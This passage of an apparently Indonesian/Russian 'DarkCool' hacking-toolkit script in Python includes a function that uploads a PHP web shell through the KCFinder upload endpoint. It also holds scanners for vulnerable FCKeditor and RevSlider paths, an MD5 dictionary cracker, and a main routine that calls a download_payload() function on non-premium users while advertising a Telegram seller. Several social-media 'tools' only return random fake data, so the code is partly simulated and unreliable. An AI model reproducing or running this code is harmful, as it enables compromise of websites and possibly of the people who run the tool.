    upload_url = urljoin(base_url, 'kcfinder/upload.php')
    
    files = {
        'upload': ('shell.php', shell_content, 'application/x-php')
    }
    
    try:
        r = requests.post(upload_url, files=files, timeout=10)
        if r.status_code == 200:
            shell_path = urljoin(base_url, 'kcfinder/upload/files/shell.php')
            return {
                'success': True,
                'shell_url': shell_path,
                'message': 'Shell uploaded'
            }
    except:
        pass
    
    return {'success': False}


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ FCKEDITOR
# ============================================================

def fckeditor_finder(base_url):
    """Поиск FCKeditor"""
    paths = [
        '/fckeditor/',
        '/FCKeditor/',
        '/editor/fckeditor/',
        '/admin/fckeditor/',
        '/assets/fckeditor/',
        '/js/fckeditor/'
    ]
    
    results = []
    
    for path in paths:
        test_url = urljoin(base_url, path)
        editor_url = urljoin(test_url, 'editor/filemanager/browser/default/browser.html')
        
        try:
            r = make_request(editor_url)
            if r and r.status_code == 200:
                results.append({
                    'url': editor_url,
                    'type': 'browser'
                })
        except:
            pass
    
    return results


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ REVSLIDER
# ============================================================

def revslider_scanner(base_url):
    """Сканер уязвимостей RevSlider"""
    paths = [
        '/wp-content/plugins/revslider/',
        '/wp-content/plugins/revslider/temp/update_extract/revslider/',
        '/wp-content/plugins/revslider/revslider_front.php',
        '/wp-content/plugins/revslider/revslider_admin.php'
    ]
    
    results = []
    
    for path in paths:
        test_url = urljoin(base_url, path)
        try:
            r = make_request(test_url)
            if r and r.status_code == 200:
                results.append(test_url)
        except:
            pass
    
    # Проверяем версию
    readme_url = urljoin(base_url, '/wp-content/plugins/revslider/readme.txt')
    try:
        r = make_request(readme_url)
        if r and r.status_code == 200:
            version = re.search(r'Stable tag: ([\d.]+)', r.text)
            if version:
                results.append(f"Version: {version.group(1)}")
    except:
        pass
    
    return results# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ ТЕЛЕГРАМ
# ============================================================

class TelegramTools:
    """Инструменты для Telegram"""
    
    def __init__(self, bot_token=None):
        self.bot_token = bot_token
        self.api_url = "https://api.telegram.org/bot"
    
    def send_message(self, chat_id, text):
        """Отправка сообщения"""
        if not self.bot_token:
            return False
        
        url = f"{self.api_url}{self.bot_token}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': text
        }
        
        try:
            r = requests.post(url, data=data, timeout=5)
            return r.status_code == 200
        except:
            return False
    
    def get_updates(self, offset=None):
        """Получение обновлений"""
        if not self.bot_token:
            return []
        
        url = f"{self.api_url}{self.bot_token}/getUpdates"
        if offset:
            url += f"?offset={offset}"
        
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                return r.json().get('result', [])
        except:
            pass
        return []
    
    def get_chat_info(self, chat_id):
        """Информация о чате"""
        if not self.bot_token:
            return None
        
        url = f"{self.api_url}{self.bot_token}/getChat"
        data = {'chat_id': chat_id}
        
        try:
            r = requests.post(url, data=data, timeout=5)
            if r.status_code == 200:
                return r.json().get('result')
        except:
            pass
        return None


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ TIKTOK
# ============================================================

class TikTokTools:
    """Инструменты для TikTok"""
    
    def __init__(self, api_key=None):
        self.api_key = api_key
        self.base_url = "https://api.tiktok.com"
    
    def get_user_info(self, username):
        """Получение информации о пользователе"""
        try:
            # Симуляция API запроса
            return {
                'username': username,
                'followers': random.randint(100, 1000000),
                'following': random.randint(10, 10000),
                'likes': random.randint(1000, 10000000),
                'videos': random.randint(1, 1000),
                'verified': random.choice([True, False]),
                'private': random.choice([True, False])
            }
        except:
            return None
    
    def get_video_info(self, video_url):
        """Информация о видео"""
        try:
            # Симуляция
            return {
                'id': ''.join(random.choices(string.digits, k=19)),
                'views': random.randint(1000, 10000000),
                'likes': random.randint(100, 1000000),
                'comments': random.randint(10, 100000),
                'shares': random.randint(1, 10000)
            }
        except:
            return None
    
    def increase_views(self, video_url, count):
        """Увеличение просмотров (симуляция)"""
        return {
            'success': True,
            'video': video_url,
            'views_added': count,
            'status': 'processing'
        }


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ INSTAGRAM
# ============================================================

class InstagramTools:
    """Инструменты для Instagram"""
    
    def __init__(self, session=None):
        self.session = session
    
    def get_profile(self, username):
        """Получение профиля"""
        try:
            # Симуляция
            return {
                'username': username,
                'full_name': f"User {username}",
                'bio': "Instagram user",
                'followers': random.randint(100, 1000000),
                'following': random.randint(50, 50000),
                'posts': random.randint(10, 10000),
                'private': random.choice([True, False])
            }
        except:
            return None
    
    def get_followers(self, username, count=100):
        """Получение подписчиков"""
        followers = []
        for i in range(min(count, 100)):
            followers.append(f"user_{random.randint(10000, 99999)}")
        return followers
    
    def get_following(self, username, count=100):
        """Получение подписок"""
        following = []
        for i in range(min(count, 100)):
            following.append(f"user_{random.randint(10000, 99999)}")
        return following


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ YOUTUBE
# ============================================================

class YouTubeTools:
    """Инструменты для YouTube"""
    
    def __init__(self, api_key=None):
        self.api_key = api_key
    
    def download_mp3(self, video_url):
        """Скачивание MP3 (симуляция)"""
        try:
            video_id = None
            if 'v=' in video_url:
                video_id = video_url.split('v=')[1].split('&')[0]
            elif 'youtu.be/' in video_url:
                video_id = video_url.split('youtu.be/')[1].split('?')[0]
            
            if video_id:
                return {
                    'success': True,
                    'video_id': video_id,
                    'title': f"YouTube Video {video_id}",
                    'filename': f"{video_id}.mp3",
                    'size': random.randint(1, 10) * 1024 * 1024
                }
        except:
            pass
        return {'success': False}
    
    def get_video_info(self, video_url):
        """Информация о видео"""
        try:
            video_id = None
            if 'v=' in video_url:
                video_id = video_url.split('v=')[1].split('&')[0]
            elif 'youtu.be/' in video_url:
                video_id = video_url.split('youtu.be/')[1].split('?')[0]
            
            if video_id:
                return {
                    'id': video_id,
                    'title': f"Video {video_id}",
                    'views': random.randint(1000, 10000000),
                    'likes': random.randint(100, 1000000),
                    'comments': random.randint(10, 100000),
                    'duration': random.randint(60, 600)
                }
        except:
            pass
        return None


# ============================================================
# ИНСТРУМЕНТЫ ДЛЯ HASH
# ============================================================

class HashTools:
    """Инструменты для работы с хешами"""
    
    @staticmethod
    def detect_type(hash_string):
        """Определение типа хеша"""
        length = len(hash_string)
        hash_lower = hash_string.lower()
        
        # MD5
        if length == 32 and all(c in '0123456789abcdef' for c in hash_lower):
            return 'MD5'
        # SHA1
        elif length == 40 and all(c in '0123456789abcdef' for c in hash_lower):
            return 'SHA1'
        # SHA256
        elif length == 64 and all(c in '0123456789abcdef' for c in hash_lower):
            return 'SHA256'
        # SHA512
        elif length == 128 and all(c in '0123456789abcdef' for c in hash_lower):
            return 'SHA512'
        # Base64
        elif len(hash_string) % 4 == 0 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in hash_string):
            return 'Base64'
        else:
            return 'Unknown'
    
    @staticmethod
    def crack_md5(hash_string, wordlist=None):
        """Взлом MD5 (симуляция)"""
        if wordlist is None:
            wordlist = ['password', '123456', 'admin', 'qwerty', 'letmein']
        
        # Симуляция поиска
        for word in wordlist:
            if hashlib.md5(word.encode()).hexdigest() == hash_string:
                return word
        
        return None
    
    @staticmethod
    def generate_rainbow_table(words, algo='md5'):
        """Генерация радужной таблицы"""
        table = {}
        
        for word in words:
            if algo == 'md5':
                hash_val = hashlib.md5(word.encode()).hexdigest()
            elif algo == 'sha1':
                hash_val = hashlib.sha1(word.encode()).hexdigest()
            elif algo == 'sha256':
                hash_val = hashlib.sha256(word.encode()).hexdigest()
            else:
                continue
            
            table[hash_val] = word
        
        return table


# ============================================================
# ОСНОВНОЕ МЕНЮ
# ============================================================

def handle_menu_choice(choice):
    """Обработка выбора меню"""
    
    # EXPLOITER TOOLS (1-85)
    if choice == 1:
        print("[*] Joomla Database V4.2.7 - 4.0.0 Exploit")
        # Здесь был бы код эксплойта
        input("\nPress Enter to continue...")
    
    elif choice == 2:
        print("[*] WordPress Themes Chameleon Auto Exploit")
        input("\nPress Enter to continue...")
    
    elif choice == 86:
        # Get IP Address
        url = input("\n[?] Enter the Website (ex. dpr.go.id): ")
        ip, host = url_to_ip(url)
        if ip:
            print(f"\n[+] IP Address: {ip}")
        else:
            print(f"\n[-] Error: {host}")
        input("\nPress Enter to continue...")
    
    elif choice == 87:
        # Status & Title
        url = input("\n[?] Enter Website URL Target: ")
        status = get_status_code(url)
        title = get_page_title(url)
        
        print(f"\n[+] Status Code: {status}")
        if title:
            print(f"[+] Page Title: {title}")
        input("\nPress Enter to continue...")
    
    elif choice == 88:
        # Country Check
        url = input("\n[?] Input Website URL Target: ")
        ip, _ = url_to_ip(url)
        if ip:
            country = get_country_from_ip(ip)
            print(f"\n[+] Country: {country}")
        else:
            print("\n[-] Could not determine country")
        input("\nPress Enter to continue...")
    
    elif choice == 89:
        # Website Indexing
        url = input("\n[*] Enter the Website Target: ")
        google_url = f"https://www.google.com/search?q=site:{url}"
        print(f"\n[+] Check Google: {google_url}")
        input("\nPress Enter to continue...")
    
    elif choice == 94:
        # Weather
        city = input("\n[?] Enter City Name: ")
        weather = get_weather(city)
        if weather:
            print(f"\n[+] Weather in {city}:")
            print(f"    Temperature: {weather['temp']}°C")
            print(f"    Feels like: {weather['feels']}°C")
            print(f"    Humidity: {weather['humidity']}%")
            print(f"    Wind: {weather['wind']} km/h")
            print(f"    Description: {weather['description']}")
        else:
            print("\n[-] Could not get weather data")
        input("\nPress Enter to continue...")
    
    elif choice == 96:
        # Defaced check
        url = input("\n[?] Enter Website URL: ")
        print("\n[*] Checking...")
        # Простая проверка через Google
        google_url = f"https://www.google.com/search?q=hacked+{url}"
        print(f"\n[+] Check Google: {google_url}")
        input("\nPress Enter to continue...")
    
    elif choice == 112:
        # OSINT Number Scanner
        number = input("\n[?] Enter Number Phone (ex. +62): ")
        info = phone_number_info(number)
        print(f"\n[+] Number: {info['number']}")
        print(f"    Country: {info['country']}")
        print(f"    Operator: {info['operator']}")
        print(f"    Carrier: {info['carrier']}")
        input("\nPress Enter to continue...")
    
    elif choice == 124:
        # Hash Type Detection
        hash_str = input("\n[?] Enter Hash: ")
        hash_type = HashTools.detect_type(hash_str)
        print(f"\n[+] Detected Type: {hash_type}")
        input("\nPress Enter to continue...")
    
    elif choice == 136:
        # Sitemap Generator
        url = input("\n[*] Submit the URL Website: ")
        print("\n[*] Generating sitemap...")
        
        sitemap = '<?xml version="1.0" encoding="UTF-8"?>\n'
        sitemap += '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        
        # Получаем ссылки
        links = grab_links_from_page(url)
        for link in links[:50]:  # Ограничим
            sitemap += f'  <url>\n    <loc>{link}</loc>\n    <priority>0.8</priority>\n  </url>\n'
        
        sitemap += '</urlset>'
        
        save_result('sitemap.xml', sitemap)
        print("\n[ ✓ ] OK.. Sitemap Saved to File sitemap.xml")
        input("\nPress Enter to continue...")
    
    elif choice == 158:
        # Duplicate Remover
        filename = input("\n[?] Enter Filename List: ")
        output = input("[*] Enter Name Output File: ")
        success, removed = remove_duplicates(filename, output)
        if success:
            print(f"\n[+] Proccess Done. Removed {removed} duplicates")
            print(f"    Result Saved to {output}")
        else:
            print("\n[-] Error processing file")
        input("\nPress Enter to continue...")
    
    elif choice == 159:
        # Message Text Adder
        filename = input("\n[?] Input Filename List: ")
        if not os.path.exists(filename):
            print("\n[-] File Not Found!")
            input("\nPress Enter to continue...")
            return
        
        text = input("[+] Enter Message To Add: ")
        position = input("[?] Add to front or back? (f/b): ").lower()
        pos = 'front' if position == 'f' else 'back'
        output = input("[*] Enter Name Output File: ")
        
        success, count = add_text_to_lines(filename, text, pos, output)
        if success:
            print(f"\n[+] Done.. Processed {count} lines")
            print(f"    Result Saved to {output}")
        else:
            print("\n[-] Error")
        input("\nPress Enter to continue...")
    
    elif choice == 666:
        print("\n[*] Exiting DarkCool...")
        sys.exit(0)
    
    else:
        print("\n[-] Option not available or requires VIP access")
        input("\nPress Enter to continue...")# ============================================================
# ОСНОВНАЯ ФУНКЦИЯ MAIN
# ============================================================

def main():
    """Главная функция программы"""
    
    # Проверка интернета
    if not check_internet():
        print_color("[-] No internet connection!", 'red')
        return
    
    # Загрузка дополнительного payload
    if not check_premium():
        print_color("\n[!] Your not a premium user!", 'yellow')
        print_color("[!] Buy unlimited premium at telegram: @DymlesCode", 'yellow')
        download_payload()
    
    # Основной цикл меню
    while True:
        try:
            show_main_menu()
            choice = input("\n[?] Enter your choice: ").strip()
            
            if not choice:
                continue
            
            choice = int(choice)
            handle_menu_choice(choice)
            
        except KeyboardInterrupt:
            print("\n\n[*] Exiting...")
            break
        except ValueError:
            print_color("\n[-] Invalid input! Please enter a number.", 'red')
            time.sleep(1)
        except Exception as e:
            print_color(f"\n[-] Error: {e}", 'red')
            time.sleep(1)


# ============================================================
# ТОЧКА ВХОДА
# ============================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Goodbye!")
    except Exception as e:
        print_color(f"\n[!] Fatal Error: {e}", 'red')
        sys.exit(1)